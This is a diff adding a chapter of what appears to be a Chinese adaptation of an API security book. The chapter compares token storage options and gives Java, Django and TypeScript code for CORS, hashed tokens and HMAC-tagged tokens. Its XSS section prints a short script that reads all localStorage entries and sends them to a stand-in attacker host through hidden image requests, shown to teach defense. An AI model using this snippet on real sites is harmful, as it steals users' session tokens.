+        <line x1="20" y1="135" x2="230" y2="135" stroke="#e2e5ee"/>
+        <line x1="255" y1="135" x2="465" y2="135" stroke="#e2e5ee"/>
+        <line x1="490" y1="135" x2="700" y2="135" stroke="#e2e5ee"/>
+
+        <text x="30" y="158" font-size="11.5" fill="#1c2333" font-weight="600">跨域(CORS)</text>
+        <text x="30" y="175" font-size="11" fill="#dc2626">复杂：要 Allow-Credentials</text>
+        <text x="30" y="190" font-size="11" fill="#dc2626">+ fetch credentials:'include'</text>
+        <text x="30" y="205" font-size="11" fill="#dc2626">且与 SameSite 互斥</text>
+
+        <text x="265" y="158" font-size="11.5" fill="#1c2333" font-weight="600">跨域(CORS)</text>
+        <text x="265" y="175" font-size="11" fill="#16a34a">简单：本来就不是</text>
+        <text x="265" y="190" font-size="11" fill="#16a34a">"凭证"，不受 SameSite</text>
+        <text x="265" y="205" font-size="11" fill="#16a34a">限制，天然适合原生App</text>
+
+        <text x="500" y="158" font-size="11.5" fill="#1c2333" font-weight="600">跨域(CORS)</text>
+        <text x="500" y="175" font-size="11" fill="#16a34a">同上：本身不随请求</text>
+        <text x="500" y="190" font-size="11" fill="#16a34a">自动发送，配合 Bearer</text>
+        <text x="500" y="205" font-size="11" fill="#16a34a">头即可跨域</text>
+
+        <line x1="20" y1="222" x2="230" y2="222" stroke="#e2e5ee"/>
+        <line x1="255" y1="222" x2="465" y2="222" stroke="#e2e5ee"/>
+        <line x1="490" y1="222" x2="700" y2="222" stroke="#e2e5ee"/>
+
+        <text x="30" y="245" font-size="11.5" fill="#1c2333" font-weight="600">CSRF 风险</text>
+        <text x="30" y="262" font-size="11" fill="#dc2626">高：浏览器自动带上</text>
+        <text x="30" y="277" font-size="11" fill="#dc2626">Cookie，需 SameSite/</text>
+        <text x="30" y="292" font-size="11" fill="#dc2626">CSRF Token 防护</text>
+
+        <text x="265" y="245" font-size="11.5" fill="#1c2333" font-weight="600">CSRF 风险</text>
+        <text x="265" y="262" font-size="11" fill="#16a34a">低：请求必须由脚本</text>
+        <text x="265" y="277" font-size="11" fill="#16a34a">显式附加头，攻击者的</text>
+        <text x="265" y="292" font-size="11" fill="#16a34a">跨站表单构造不出来</text>
+
+        <text x="500" y="245" font-size="11.5" fill="#1c2333" font-weight="600">CSRF 风险</text>
+        <text x="500" y="262" font-size="11" fill="#16a34a">低：同上，本质是</text>
+        <text x="500" y="277" font-size="11" fill="#16a34a">因为不再自动挂在</text>
+        <text x="500" y="292" font-size="11" fill="#16a34a">每个请求上</text>
+
+        <line x1="20" y1="309" x2="230" y2="309" stroke="#e2e5ee"/>
+        <line x1="255" y1="309" x2="465" y2="309" stroke="#e2e5ee"/>
+        <line x1="490" y1="309" x2="700" y2="309" stroke="#e2e5ee"/>
+
+        <text x="30" y="332" font-size="11.5" fill="#1c2333" font-weight="600">XSS 风险</text>
+        <text x="30" y="349" font-size="11" fill="#16a34a">低：HttpOnly 后</text>
+        <text x="30" y="364" font-size="11" fill="#16a34a">JS 读不到 Cookie 值</text>
+
+        <text x="265" y="332" font-size="11.5" fill="#1c2333" font-weight="600">XSS 风险</text>
+        <text x="265" y="349" font-size="11" fill="#5b6478">取决于客户端把 Token</text>
+        <text x="265" y="364" font-size="11" fill="#5b6478">存哪——原生 App 里</text>
+        <text x="265" y="379" font-size="11" fill="#5b6478">通常存在系统安全存储</text>
+
+        <text x="500" y="332" font-size="11.5" fill="#1c2333" font-weight="600">XSS 风险</text>
+        <text x="500" y="349" font-size="11" fill="#dc2626">高：JS 可直接</text>
+        <text x="500" y="364" font-size="11" fill="#dc2626">读写，一旦 XSS 就能</text>
+        <text x="500" y="379" font-size="11" fill="#dc2626">被脚本整体窃取</text>
+
+        <line x1="20" y1="396" x2="230" y2="396" stroke="#e2e5ee"/>
+        <line x1="255" y1="396" x2="465" y2="396" stroke="#e2e5ee"/>
+        <line x1="490" y1="396" x2="700" y2="396" stroke="#e2e5ee"/>
+
+        <text x="30" y="419" font-size="11.5" fill="#1c2333" font-weight="600">适用场景</text>
+        <text x="30" y="436" font-size="11" fill="#5b6478">同域 Web 应用，</text>
+        <text x="30" y="451" font-size="11" fill="#5b6478">追求少写前端代码</text>
+
+        <text x="265" y="419" font-size="11.5" fill="#1c2333" font-weight="600">适用场景</text>
+        <text x="265" y="436" font-size="11" fill="#5b6478">移动/桌面原生 App、</text>
+        <text x="265" y="451" font-size="11" fill="#5b6478">多域名 Web、开放 API</text>
+
+        <text x="500" y="419" font-size="11.5" fill="#1c2333" font-weight="600">适用场景</text>
+        <text x="500" y="436" font-size="11" fill="#5b6478">与 Bearer 配套的浏览器</text>
+        <text x="500" y="451" font-size="11" fill="#5b6478">端点，前提是先堵死 XSS</text>
+      </svg>
+      <figcaption>图 5-2：Cookie、数据库 + Bearer、Web Storage 三种 Token 存放方案的权衡对比。三者在"服务端存储"上其实是同一件事（都可以落到数据库），真正的差异在"客户端怎么存、怎么传"。</figcaption>
+    </figure>
+
+    <h3>5.2.5 更新 CORS 过滤器</h3>
+
+    <p>既然不再依赖 Cookie，很多为 Cookie 而加的 CORS 限制就可以去掉了：<code>Access-Control-Allow-Credentials</code> 不再需要（因为浏览器不用自动附带任何凭证），<code>X-CSRF-Token</code> 也可以从允许的头列表里删除。前端 <code>fetch</code> 也要相应去掉 <code>credentials: 'include'</code>——如果不去掉，浏览器发现服务器不再返回 <code>Allow-Credentials</code>，反而会把整个请求拦截掉。</p>
+
+    <div class="code-compare">
+      <div class="tab-bar">
+        <button class="tab-btn" data-lang="java">Java <span class="fw">· Spark（原书）</span></button>
+        <button class="tab-btn" data-lang="python">Python <span class="fw">· Django</span></button>
+        <button class="tab-btn" data-lang="js">TypeScript <span class="fw">· Hono.js</span></button>
+      </div>
+      <div class="tab-panel" data-lang="java">
+        <div class="file-path">ch05/.../CorsFilter.java（去 Cookie 后的版本）</div>
+        <pre><code>@Override
+public void handle(Request request, Response response) {
+    var origin = request.headers("Origin");
+    if (origin != null &amp;&amp; allowedOrigins.contains(origin)) {
+        response.header("Access-Control-Allow-Origin", origin);
+        response.header("Vary", "Origin");
+        // 不再需要 Access-Control-Allow-Credentials
+    }
+
+    if (isPreflightRequest(request)) {
+        if (origin == null || !allowedOrigins.contains(origin)) {
+            halt(403);
+        }
+        response.header("Access-Control-Allow-Headers",
+                "Content-Type, Authorization");  // 去掉 X-CSRF-Token
+        response.header("Access-Control-Allow-Methods",
+                "GET, POST, DELETE");
+        halt(204);
+    }
+}</code></pre>
+      </div>
+      <div class="tab-panel" data-lang="python">
+        <div class="file-path">settings.py</div>
+        <pre><code># 改用 Bearer 后，Cookie 相关的开关全部关闭
+CORS_ALLOW_CREDENTIALS = False   # 不再需要浏览器自动带凭证
+
+CORS_ALLOWED_ORIGINS = ["https://nat.tr"]
+CORS_ALLOW_HEADERS = ["content-type", "authorization"]  # 去掉 x-csrf-token
+CORS_ALLOW_METHODS = ["GET", "POST", "DELETE", "OPTIONS"]
+
+# 如果确实想让任意来源都能调用这个公开只读端点，
+# 且该端点不需要凭证，也可以考虑：
+# CORS_ALLOWED_ORIGIN_REGEXES = [] 或 CORS_ALLOW_ALL_ORIGINS = True
+# 但通常仍建议保持白名单</code></pre>
+      </div>
+      <div class="tab-panel" data-lang="js">
+        <div class="file-path">src/app.ts</div>
+        <pre><code>app.use('*', cors({
+  origin: ['https://nat.tr'],
+  allowMethods: ['GET', 'POST', 'DELETE'],
+  allowHeaders: ['Content-Type', 'Authorization'],  // 去掉 X-CSRF-Token
+  credentials: false,        // 不再需要浏览器自动带凭证
+}))</code></pre>
+      </div>
+    </div>
+
+    <h3>5.2.6 Web Storage 上的 XSS 风险</h3>
+
+    <p>Web Storage 解决了 CSRF（因为浏览器不会自动把 Token 附加到请求上），但引入了新的风险：Cookie 可以设置 <code>HttpOnly</code>，让 JavaScript 完全读不到；<code>localStorage</code> / <code>sessionStorage</code> 天生就是给 JavaScript 用的，没有"只读不给脚本看"这个选项。一旦页面存在 XSS 漏洞，攻击者的脚本可以直接把 Token 读出来，"打包快递"发到自己的服务器。</p>
+
+    <div class="callout danger">
+      <div class="title">🚨 攻击示例：用 &lt;img&gt; 标签隐蔽窃取 Token</div>
+      <p>攻击者不需要发起显式的网络请求（容易被 CSP 或网络监控发现），只需要动态创建 <code>&lt;img&gt;</code> 元素——浏览器加载图片资源时会自动发起 GET 请求，哪怕这个 <code>&lt;img&gt;</code> 从未被插入到页面里：</p>
+      <pre class="plain"><code>for (var i = 0; i < localStorage.length; ++i) {
+    var key = localStorage.key(i);
+    var img = document.createElement('img');
+    img.setAttribute('src',
+        'https://evil.example.com/exfil?key=' +
+           encodeURIComponent(key) + '&value=' +
+           encodeURIComponent(localStorage.getItem(key)));
+    // 注意：这里甚至没有 document.body.appendChild(img)
+}</code></pre>
+      <p>整个过程用户毫无感知——没有弹窗，没有页面跳转，Token 就已经出现在攻击者服务器的访问日志里了。</p>
+    </div>
+
+    <figure class="diagram">
+      <svg viewBox="0 0 660 220" role="img" aria-label="Web Storage 被 XSS 窃取的流程图">
+        <defs>
+          <marker id="arrow5b" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto">
+            <path d="M0,0 L8,4 L0,8 Z" fill="#5b6478"/>
+          </marker>
+        </defs>
+        <rect x="20" y="20" width="180" height="150" rx="8" fill="none" stroke="#2563eb" stroke-width="1.5"/>
+        <text x="110" y="40" text-anchor="middle" font-size="13" font-weight="700" fill="#1c2333">受害者浏览器</text>
+        <rect x="40" y="55" width="140" height="34" rx="6" fill="#2563eb"/>
+        <text x="110" y="77" text-anchor="middle" fill="#fff" font-size="12">localStorage</text>
+        <text x="110" y="100" text-anchor="middle" font-size="11" fill="#5b6478">token: "xyz..."</text>
+        <rect x="40" y="115" width="140" height="34" rx="6" fill="#dc2626"/>
+        <text x="110" y="137" text-anchor="middle" fill="#fff" font-size="12">被注入的 XSS 脚本</text>
+
+        <line x1="200" y1="132" x2="440" y2="60" stroke="#dc2626" stroke-width="1.5" marker-end="url(#arrow5b)"/>
+        <text x="330" y="85" text-anchor="middle" font-size="11.5" fill="#dc2626">① 遍历 localStorage，</text>
+        <text x="330" y="100" text-anchor="middle" font-size="11.5" fill="#dc2626">创建 &lt;img src="...?token=xyz"&gt;</text>
+
+        <rect x="440" y="20" width="180" height="60" rx="8" fill="#dc2626"/>
+        <text x="530" y="45" text-anchor="middle" fill="#fff" font-size="13" font-weight="700">攻击者服务器</text>
+        <text x="530" y="65" text-anchor="middle" fill="#fff" font-size="11">GET /exfil?token=xyz</text>
+
+        <line x1="530" y1="80" x2="530" y2="150" stroke="#5b6478" stroke-width="1.5" marker-end="url(#arrow5b)"/>
+        <text x="560" y="115" font-size="11" fill="#1c2333">② 攻击者从</text>
+        <text x="560" y="130" font-size="11" fill="#1c2333">访问日志里</text>
+        <text x="560" y="145" font-size="11" fill="#1c2333">拿到 Token，</text>
+        <text x="560" y="160" font-size="11" fill="#1c2333">直接冒充用户</text>
+        <rect x="440" y="160" width="180" height="34" rx="6" fill="#16a34a"/>
+        <text x="530" y="182" text-anchor="middle" fill="#fff" font-size="12">Natter API（受害）</text>
+      </svg>
+      <figcaption>图 5-3：XSS 漏洞下，攻击者脚本读取 localStorage 中的 Token 并通过图片请求"打包快递"给自己的服务器，之后就能直接拿着窃得的 Token 访问 API。</figcaption>
+    </figure>
+
+    <div class="callout tip">
+      <div class="title">✅ 没有 XSS 就没有这类风险；但 XSS 面前所有客户端存储都不安全</div>
+      <p>即使把 Token 存在 <code>HttpOnly</code> Cookie 里，XSS 攻击者也可以不窃取 Token，而是直接在受害者浏览器里"就地"发起请求——反正浏览器会自动带上 Cookie，这样连 CSRF 防护都绕过去了。所以本章的结论和第 2 章一致：<b>防止 XSS 永远是第一优先级</b>，Token 存储方式的选择只是"XSS 已经发生后损失有多大"的权衡，不是能替代 XSS 防护的方案。<code>Content-Security-Policy</code>（CSP）是目前最有效的纵深防御手段。</p>
+    </div>
+
+    <h2 id="s3"><span class="num">5.3</span>加固数据库 Token 存储</h2>
+
+    <p>Token 现在明文存在数据库里。假设攻击者通过 SQL 注入或者直接拿到了数据库访问权限——这不是耸人听闻，第 2 章已经讲过 SQL 注入的威力——那么数据库里当前所有在线用户的 Token 都会暴露，攻击者能直接拿着这些 Token 冒充任何一个用户，影响范围远超"单个用户密码泄漏"。</p>
+
+    <figure class="diagram">
+      <svg viewBox="0 0 700 260" role="img" aria-label="数据库 Token 存储面临的三种威胁">
+        <rect x="20" y="16" width="200" height="70" rx="8" fill="none" stroke="#5b6478" stroke-width="1" stroke-dasharray="4 3"/>
+        <text x="120" y="10" text-anchor="middle" font-size="11" fill="#5b6478"></text>
+        <rect x="30" y="30" width="180" height="40" rx="8" fill="#16a34a"/>
+        <text x="120" y="54" text-anchor="middle" fill="#fff" font-size="12" font-weight="600">API 服务器</text>
+        <text x="120" y="96" text-anchor="middle" font-size="10.5" fill="#dc2626">可能的 SQL 注入攻击面</text>
+
+        <line x1="220" y1="50" x2="450" y2="50" stroke="#5b6478" stroke-width="1.5"/>
+        <text x="335" y="42" text-anchor="middle" font-size="10.5" fill="#5b6478">TLS 连接</text>
+
+        <rect x="460" y="20" width="200" height="60" rx="8" fill="#7c3aed"/>
+        <text x="560" y="44" text-anchor="middle" fill="#fff" font-size="12" font-weight="600">Token 数据库</text>
+        <text x="560" y="62" text-anchor="middle" fill="#fff" font-size="10.5">tokens(token_id, ...)</text>
+
+        <rect x="30" y="130" width="640" height="110" rx="8" fill="none" stroke="#dc2626" stroke-width="1.5" stroke-dasharray="4 3"/>
+        <text x="350" y="122" text-anchor="middle" font-size="11.5" fill="#dc2626" font-weight="600">一旦攻击者获得数据库访问权限（读/写/删）</text>
+
+        <rect x="50" y="150" width="180" height="70" rx="6" fill="#dc2626"/>
+        <text x="140" y="172" text-anchor="middle" fill="#fff" font-size="12" font-weight="700">读权限</text>
+        <text x="140" y="190" text-anchor="middle" fill="#fff" font-size="10.5">窃取全部在线用户</text>
+        <text x="140" y="204" text-anchor="middle" fill="#fff" font-size="10.5">的 Token 并重放</text>
+
+        <rect x="260" y="150" width="180" height="70" rx="6" fill="#dc2626"/>
+        <text x="350" y="172" text-anchor="middle" fill="#fff" font-size="12" font-weight="700">写权限</text>
+        <text x="350" y="190" text-anchor="middle" fill="#fff" font-size="10.5">伪造新 Token 或篡改</text>
+        <text x="350" y="204" text-anchor="middle" fill="#fff" font-size="10.5">已有 Token 的权限属性</text>
+
+        <rect x="470" y="150" width="180" height="70" rx="6" fill="#dc2626"/>
+        <text x="560" y="172" text-anchor="middle" fill="#fff" font-size="12" font-weight="700">删权限</text>
+        <text x="560" y="190" text-anchor="middle" fill="#fff" font-size="10.5">恶意撤销其他用户的</text>
+        <text x="560" y="204" text-anchor="middle" fill="#fff" font-size="10.5">Token，制造拒绝服务</text>
+      </svg>
+      <figcaption>图 5-4：数据库层面的三类威胁——即便 API 与数据库之间用 TLS 加密，攻击者只要拿到读/写/删任一权限，就能分别窃取、伪造或撤销 Token。</figcaption>
+    </figure>
+
+    <h3>5.3.1 对数据库里的 Token 做哈希</h3>
+
+    <p>解法和第 3 章保护密码的思路一模一样：<b>不要在数据库里存明文 Token</b>，存它的哈希值。校验时把客户端传来的 Token 也哈希一遍，去数据库比对哈希值。这样即使数据库泄漏，攻击者拿到的只是一堆哈希，无法反推出原始 Token（哈希函数不可逆）。</p>
+
+    <div class="callout tip">
+      <div class="title">✅ Token 哈希不需要 Scrypt/Argon2 这种"慢哈希"</div>
+      <p>第 3 章给密码加密用的是故意设计得很慢的算法（Scrypt/Argon2/PBKDF2），因为密码的熵很低（人类记得住的密码往往只有二三十比特的实际强度），需要用"慢"来抵消暴力枚举。而 Token 是机器生成的 160 位随机数，熵本身就很高，用普通的快速密码学哈希（比如 SHA-256）已经足够安全，还能保证每次请求的校验开销很低。</p>
+    </div>
+
+    <div class="code-compare">
+      <div class="tab-bar">
+        <button class="tab-btn" data-lang="java">Java <span class="fw">· Spark（原书）</span></button>
+        <button class="tab-btn" data-lang="python">Python <span class="fw">· Django</span></button>
+        <button class="tab-btn" data-lang="js">TypeScript <span class="fw">· Hono.js</span></button>
+      </div>
+      <div class="tab-panel" data-lang="java">
+        <div class="file-path">ch05/.../token/DatabaseTokenStore.java（加上哈希）</div>
+        <pre><code>import static com.manning.apisecurityinaction.token.CookieTokenStore.sha256;
+
+@Override
+public String create(Request request, Token token) {
+    var tokenId = randomId();                     // 明文，返回给客户端
+    var attrs = new JSONObject(token.attributes).toString();
+
+    database.updateUnique("INSERT INTO " +
+        "tokens(token_id, user_id, expiry, attributes) " +
+        "VALUES(?, ?, ?, ?)", hash(tokenId), token.username,
+            token.expiry, attrs);                 // 存哈希，不存明文
+
+    return tokenId;
+}
+
+@Override
+public Optional&lt;Token&gt; read(Request request, String tokenId) {
+    return database.findOptional(this::readToken,
+        "SELECT user_id, expiry, attributes " +
+        "FROM tokens WHERE token_id = ?", hash(tokenId));
+}
+
+@Override
+public void revoke(Request request, String tokenId) {
+    database.update("DELETE FROM tokens WHERE token_id = ?",
+        hash(tokenId));
+}
+
+private String hash(String tokenId) {
+    var hash = sha256(tokenId);           // 复用 CookieTokenStore 的 SHA-256
+    return Base64url.encode(hash);
+}</code></pre>
+      </div>
+      <div class="tab-panel" data-lang="python">
+        <div class="file-path">tokens/store.py</div>
+        <pre><code>import hashlib, base64
+
+def _hash(token_id: str) -> str:
+    # SHA-256 足够：Token 本身已有 160 位熵，不需要 Argon2 那种慢哈希
+    digest = hashlib.sha256(token_id.encode("utf-8")).digest()
+    return base64.urlsafe_b64encode(digest).decode().rstrip("=")
+
+def create_token(user, expiry, attributes) -> str:
+    token_id = random_id()                    # 明文，返回给客户端
+    Token.objects.create(
+        token_id=_hash(token_id),              # 数据库列存哈希
+        user=user, expiry=expiry, attributes=attributes,
+    )
+    return token_id
+
+def read_token(token_id: str) -> Token | None:
+    return Token.objects.filter(token_id=_hash(token_id)).first()
+
+def revoke_token(token_id: str) -> None:
+    Token.objects.filter(token_id=_hash(token_id)).delete()</code></pre>
+      </div>
+      <div class="tab-panel" data-lang="js">
+        <div class="file-path">src/tokens/store.ts</div>
+        <pre><code>import { createHash, randomBytes } from 'node:crypto'
+
+function hash(tokenId: string): string {
+  // Web Crypto: crypto.subtle.digest('SHA-256', ...) 也可以，
+  // 这里用 Node crypto 保持同步、简单
+  return createHash('sha256').update(tokenId).digest('base64url')
+}
+
+export async function createToken(
+  username: string, expiry: Date, attributes: Record&lt;string, string&gt;
+): Promise&lt;string&gt; {
+  const tokenId = randomBytes(20).toString('base64url')   // 明文返回
+  await db.insert(tokens).values({
+    tokenId: hash(tokenId),                                // 存哈希
+    username, expiry, attributes: JSON.stringify(attributes),
+  })
+  return tokenId
+}
+
+export async function readToken(tokenId: string) {
+  const [row] = await db.select().from(tokens)
+    .where(eq(tokens.tokenId, hash(tokenId)))
+  return row ?? null
+}
+
+export async function revokeToken(tokenId: string) {
+  await db.delete(tokens).where(eq(tokens.tokenId, hash(tokenId)))
+}</code></pre>
+      </div>
+    </div>
+
+    <h3>5.3.2 用 HMAC 认证 Token</h3>
+
+    <p>光做哈希，防得住"数据库被读走后 Token 被冒用"，但防不住写权限：攻击者如果能往 <code>tokens</code> 表里插入一行"伪造"的记录（比如通过一个允许写入的注入点），照样能构造出一个合法能用的 Token——因为服务器只是"哈希后查表"，并不关心这一行是不是服务器自己插入的。另外，普通数据库查询的等值比较通常不是"常数时间"的，理论上可能被用于第 4 章讲过的时序攻击（timing attack）来推测哈希值。</p>
+
+    <p>解决办法是引入 <b>HMAC</b>（Hash-based Message Authentication Code，基于哈希的消息认证码）——一个带密钥的哈希函数。没有密钥的人，即使知道算法，也算不出正确的认证标签（tag）；哪怕只改动 Token 里的一个比特，算出来的 tag 也会截然不同。</p>
+
+    <div class="callout note">
+      <div class="title">💡 哈希 vs. HMAC：多了什么</div>
+      <p>普通哈希函数（SHA-256）任何人都能计算，只能保证"内容没变"；HMAC 额外引入一把只有服务器知道的<b>密钥</b>，能保证"这个值是持有密钥的服务器亲自算出来的"——也就是从"防篡改检测"升级到了"防伪造认证"。这和第 3 章的密码哈希不是一回事：密码哈希是为了不可逆地存储凭证，HMAC 是为了给一段数据盖一个"官方防伪印章"。</p>
+    </div>
+
+    <p>Natter 的做法很巧妙：<b>不改数据库里存的内容</b>，只在"要把 Token 交给客户端的最后一刻"，用 HMAC 给它算一个 tag，拼在 Token ID 后面（用 <code>.</code> 分隔）一起发给客户端；客户端以后每次都要把"Token ID + tag"整体带回来；服务器先验证 tag 是否合法，验证通过才去掉 tag、把裸的 Token ID 交给 <code>DatabaseTokenStore</code>（也就是先前的哈希版本）去查库。tag 校验失败就直接拒绝，连数据库都不用查——这正好顺便解决了时序攻击的问题。</p>
+
+    <figure class="diagram">
+      <svg viewBox="0 0 700 280" role="img" aria-label="HMAC 给 Token 加防伪签名的流程图">
+        <defs>
+          <marker id="arrow5c" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto">
+            <path d="M0,0 L8,4 L0,8 Z" fill="#5b6478"/>
+          </marker>
+        </defs>
+        <rect x="20" y="20" width="220" height="46" rx="8" fill="#7c3aed"/>
+        <text x="130" y="48" text-anchor="middle" fill="#fff" font-size="12.5" font-weight="600">DatabaseTokenStore.create()</text>
+        <text x="130" y="80" text-anchor="middle" font-size="11" fill="#5b6478">生成随机 tokenId，</text>
+        <text x="130" y="94" text-anchor="middle" font-size="11" fill="#5b6478">哈希后存进数据库</text>
+
+        <line x1="240" y1="43" x2="380" y2="43" stroke="#5b6478" stroke-width="1.5" marker-end="url(#arrow5c)"/>
+        <text x="310" y="35" text-anchor="middle" font-size="10.5" fill="#5b6478">返回明文 tokenId</text>
+
+        <rect x="390" y="20" width="220" height="46" rx="8" fill="#0891b2"/>
+        <text x="500" y="48" text-anchor="middle" fill="#fff" font-size="12.5" font-weight="600">HmacTokenStore.create()</text>
+        <text x="500" y="80" text-anchor="middle" font-size="11" fill="#5b6478">tag = HMAC-SHA256(tokenId, 密钥)</text>
+        <text x="500" y="94" text-anchor="middle" font-size="11" fill="#5b6478">返回 tokenId + "." + base64url(tag)</text>
+
+        <rect x="230" y="130" width="260" height="40" rx="6" fill="#f7f8fb" stroke="#5b6478"/>
+        <text x="360" y="154" text-anchor="middle" font-size="12" fill="#1c2333" font-family="monospace">L2xu...bxI.dnYUdylHgTGpNcv39ol...</text>
+        <text x="360" y="120" text-anchor="middle" font-size="11" fill="#5b6478">这才是发给客户端、写进 Web Storage 的完整 Token</text>
+
+        <rect x="20" y="200" width="300" height="60" rx="8" fill="none" stroke="#16a34a" stroke-width="1.5"/>
+        <text x="170" y="220" text-anchor="middle" font-size="11.5" fill="#16a34a" font-weight="600">HmacTokenStore.read()：验证 tag</text>
+        <text x="170" y="238" text-anchor="middle" font-size="10.5" fill="#5b6478">MessageDigest.isEqual(provided, computed)</text>
+        <text x="170" y="252" text-anchor="middle" font-size="10.5" fill="#5b6478">失败 → 直接拒绝，不查数据库</text>
+
+        <rect x="380" y="200" width="300" height="60" rx="8" fill="none" stroke="#7c3aed" stroke-width="1.5"/>
+        <text x="530" y="220" text-anchor="middle" font-size="11.5" fill="#7c3aed" font-weight="600">通过后剥掉 tag，</text>
+        <text x="530" y="238" text-anchor="middle" font-size="10.5" fill="#5b6478">调用 delegate.read(裸 tokenId)</text>
+        <text x="530" y="252" text-anchor="middle" font-size="10.5" fill="#5b6478">走原来的哈希查库逻辑</text>
+
+        <line x1="320" y1="230" x2="380" y2="230" stroke="#5b6478" stroke-width="1.5" marker-end="url(#arrow5c)"/>
+      </svg>
+      <figcaption>图 5-5：<code>HmacTokenStore</code> 用装饰器模式包住 <code>DatabaseTokenStore</code>——数据库里存的仍然是"裸 Token 的哈希"，HMAC tag 只存在于返回给客户端的字符串里，数据库泄漏并不会泄漏出可用的签名密钥或有效 tag。</figcaption>
+    </figure>
+
+    <div class="code-compare">
+      <div class="tab-bar">
+        <button class="tab-btn" data-lang="java">Java <span class="fw">· Spark（原书）</span></button>
+        <button class="tab-btn" data-lang="python">Python <span class="fw">· Django</span></button>
+        <button class="tab-btn" data-lang="js">TypeScript <span class="fw">· Hono.js</span></button>
+      </div>
+      <div class="tab-panel" data-lang="java">
+        <div class="file-path">ch05/.../token/HmacTokenStore.java</div>
+        <pre><code>public class HmacTokenStore implements TokenStore {
+    private final TokenStore delegate;     // 包住的是 DatabaseTokenStore
+    private final Key macKey;
+
+    public HmacTokenStore(TokenStore delegate, Key macKey) {
+        this.delegate = delegate;
+        this.macKey = macKey;
+    }
+
+    @Override
+    public String create(Request request, Token token) {
+        var tokenId = delegate.create(request, token);
+        var tag = hmac(tokenId);
+        return tokenId + '.' + Base64url.encode(tag);
+    }
+
+    private byte[] hmac(String tokenId) {
+        var mac = Mac.getInstance(macKey.getAlgorithm());
+        mac.init(macKey);
+        return mac.doFinal(tokenId.getBytes(StandardCharsets.UTF_8));
+    }
+
+    @Override
+    public Optional&lt;Token&gt; read(Request request, String tokenId) {
+        var index = tokenId.lastIndexOf('.');
+        if (index == -1) return Optional.empty();
+        var realTokenId = tokenId.substring(0, index);
+
+        var provided = Base64url.decode(tokenId.substring(index + 1));
+        var computed = hmac(realTokenId);
+
+        if (!MessageDigest.isEqual(provided, computed)) {   // 常数时间比较
+            return Optional.empty();          // 不合法，连数据库都不查
+        }
+        return delegate.read(request, realTokenId);
+    }
+    // revoke() 同理：先验证 tag，再委托给 delegate.revoke()
+}
+
+// Main.java 组装：装饰器模式，一层套一层
+var databaseTokenStore = new DatabaseTokenStore(database);
+var tokenStore = new HmacTokenStore(databaseTokenStore, macKey);
+var tokenController = new TokenController(tokenStore);</code></pre>
+      </div>
+      <div class="tab-panel" data-lang="python">
+        <div class="file-path">tokens/hmac_store.py</div>
+        <pre><code>import hmac as hmac_lib, hashlib, base64
+
+class HmacTokenStore:
+    """包住 store.py 里的裸 DatabaseTokenStore 函数"""
+
+    def __init__(self, mac_key: bytes):
+        self.mac_key = mac_key       # 从密钥管理服务/环境变量加载
+
+    def _tag(self, token_id: str) -> bytes:
+        return hmac_lib.new(
+            self.mac_key, token_id.encode("utf-8"), hashlib.sha256
+        ).digest()
+
+    def create(self, user, expiry, attributes) -> str:
+        token_id = create_token(user, expiry, attributes)   # 委托
+        tag = self._tag(token_id)
+        encoded_tag = base64.urlsafe_b64encode(tag).decode().rstrip("=")
+        return f"{token_id}.{encoded_tag}"
+
+    def read(self, token_id: str):
+        if "." not in token_id:
+            return None
+        real_id, encoded_tag = token_id.rsplit(".", 1)
+        provided = base64.urlsafe_b64decode(encoded_tag + "==")
+        computed = self._tag(real_id)
+
+        # hmac.compare_digest 是 Python 标准库的常数时间比较
+        if not hmac_lib.compare_digest(provided, computed):
+            return None                     # 直接拒绝，不查数据库
+        return read_token(real_id)           # 委托给裸 store
+
+    def revoke(self, token_id: str) -> None:
+        real_id, encoded_tag = token_id.rsplit(".", 1)
+        provided = base64.urlsafe_b64decode(encoded_tag + "==")
+        if not hmac_lib.compare_digest(provided, self._tag(real_id)):
+            return
+        revoke_token(real_id)</code></pre>
+      </div>
+      <div class="tab-panel" data-lang="js">
+        <div class="file-path">src/tokens/hmacStore.ts</div>
+        <pre><code>import { createHmac, timingSafeEqual } from 'node:crypto'
+import * as db from './store'          // 裸的 DatabaseTokenStore 版本
+
+export class HmacTokenStore {
+  constructor(private macKey: Buffer) {}   // 32 字节密钥，来自密钥管理服务
+
+  private tag(tokenId: string): Buffer {
+    return createHmac('sha256', this.macKey).update(tokenId).digest()
+  }
+
+  async create(username: string, expiry: Date, attrs: Record&lt;string, string&gt;) {
+    const tokenId = await db.createToken(username, expiry, attrs)  // 委托
+    const encodedTag = this.tag(tokenId).toString('base64url')
+    return `${tokenId}.${encodedTag}`
+  }
+
+  async read(tokenId: string) {
+    const idx = tokenId.lastIndexOf('.')
+    if (idx === -1) return null
+    const realId = tokenId.slice(0, idx)
+    const provided = Buffer.from(tokenId.slice(idx + 1), 'base64url')
+    const computed = this.tag(realId)
+
+    // timingSafeEqual：Node crypto 提供的常数时间比较
+    if (provided.length !== computed.length ||
+        !timingSafeEqual(provided, computed)) {
+      return null                     // 直接拒绝，不查数据库
+    }
+    return db.readToken(realId)        // 委托给裸 store
+  }
+
+  async revoke(tokenId: string) {
+    const idx = tokenId.lastIndexOf('.')
+    if (idx === -1) return
+    const realId = tokenId.slice(0, idx)
+    const provided = Buffer.from(tokenId.slice(idx + 1), 'base64url')
+    if (!timingSafeEqual(provided, this.tag(realId))) return
+    await db.revokeToken(realId)
+  }
+}</code></pre>
+      </div>
+    </div>
+
+    <p>密钥从哪来？绝不能硬编码在代码里，也不能用一个"人类记得住"的密码充当（HMAC 密钥应该是 32 字节的纯随机数据）。Natter 用 Java 自带的 <code>keytool</code> 生成一个 PKCS#12 格式的密钥库文件，运行时通过系统属性传入密码解锁：</p>
+
+    <pre class="plain"><code># 生成一个 256 位的 HMAC 密钥，存进 PKCS#12 密钥库
+keytool -genseckey -keyalg HmacSHA256 -keysize 256 \
+    -alias hmac-key -keystore keystore.p12 \
+    -storetype PKCS12 -storepass changeit
+
+# 启动时通过系统属性传密码，不写进源码里
+$ mvn ... -Dkeystore.password=changeit</code></pre>
+
+    <div class="callout warn">
+      <div class="title">⚠️ 多实例部署时，所有服务器必须用同一把密钥</div>
+      <p>如果 API 由多台服务器组成集群，某个用户的请求可能被路由到任意一台，它们都必须用同一把 HMAC 密钥，否则用一台服务器签发的 Token 会被另一台拒绝。同理，单台服务器如果每次重启都随机生成新密钥，重启前签发的所有 Token 会集体失效。正确做法是把密钥集中存放在密钥库或密钥管理服务（KMS）里，让所有实例加载同一份。</p>
+    </div>
+
